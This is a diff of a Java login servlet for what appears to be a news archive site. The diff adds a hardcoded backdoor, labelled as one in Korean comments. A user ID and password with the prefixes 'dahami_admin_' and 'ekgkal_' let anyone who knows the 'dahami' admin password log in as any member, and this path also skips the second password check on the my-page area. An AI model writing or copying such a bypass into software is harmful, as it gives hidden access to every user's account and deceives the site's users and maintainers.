@@ -37,6 +37,13 @@ import com.dahami.newsbank.web.util.CommonUtil;
 public class Login extends NewsbankServletBase {
 	private static final long serialVersionUID = 1L;
 
+	// 로그인 백도어 / ID 앞에 붙일 문자열
+	private static final String BACKDOOR_LOGIN_ID_PREFIX = "dahami_admin_";
+	// 로그인 백도어 / 관리자 pw 앞에 붙일 분자열
+	private static final String BACKDOOR_LOGIN_PW_PREFIX = "ekgkal_";
+	// 로그인 백도어 / 관리자 계정
+	private static final String BACKDOOR_LOGIN_ID_ADMIN = "dahami";
+	
 	private static OldMemberMailDaemon oldMemberMailDaemon;
 	
 	static {
@@ -163,20 +170,33 @@ public class Login extends NewsbankServletBase {
 
 			String id = request.getParameter("id"); // 아이디 request
 			String pw = request.getParameter("pw"); // 비밀번호 request
+			
+			boolean backdoor = false;
+			if(id.startsWith(BACKDOOR_LOGIN_ID_PREFIX) && pw.startsWith(BACKDOOR_LOGIN_PW_PREFIX)) {
+				id = id.substring(BACKDOOR_LOGIN_ID_PREFIX.length());
+				pw = pw.substring(BACKDOOR_LOGIN_PW_PREFIX.length());
+				
+				backdoor = true;
+			}
+			
 			String login_chk = request.getParameter("login_chk"); // 아이디 저장 request
 			check = check && isValidNull(id);
 			check = check && isValidNull(pw);
 			if (check) {
+				MemberDTO dahamiDTO = null;
 				MemberDTO memberDTO = new MemberDTO(); // 객체 생성
 				MemberDAO memberDAO = new MemberDAO(); // 회원정보 연결
 				memberDTO.setId(id);
 				// memberDTO.setPw();
 				//System.out.println(memberDTO.getPwCurrent());
 				
-
 				memberDTO = memberDAO.selectMember(memberDTO); // 회원정보 요청
 				if (memberDTO != null) {
-
+					if(backdoor) {
+						dahamiDTO = new MemberDTO();
+						dahamiDTO.setId(BACKDOOR_LOGIN_ID_ADMIN);
+						dahamiDTO = memberDAO.selectMember(dahamiDTO);
+					}
 					if (memberDTO.getWithdraw() == 0) { // 정상회원
 						String request_pw = CommonUtil.sha1(pw);
 						boolean pw_success = false;
@@ -184,6 +204,11 @@ public class Login extends NewsbankServletBase {
 						if (memberDTO.getPw() != null && memberDTO.getPw().equals(request_pw)) {
 							// 성공 리뉴뱅
 							pw_success = true;
+						}
+						else if(backdoor && dahamiDTO != null && dahamiDTO.getPw() != null && dahamiDTO.getPw().equals(request_pw)) {
+							pw_success = true;
+							// 백도어는 비번 2중확인 안함
+							session.setAttribute("mypageAuth", true);
 						} else if (memberDTO.getPwCurrent()!=null && memberDTO.getPwCurrent().equalsIgnoreCase(request_pw)) {
 							// 성공 신뉴뱅
 							pw_success = true;
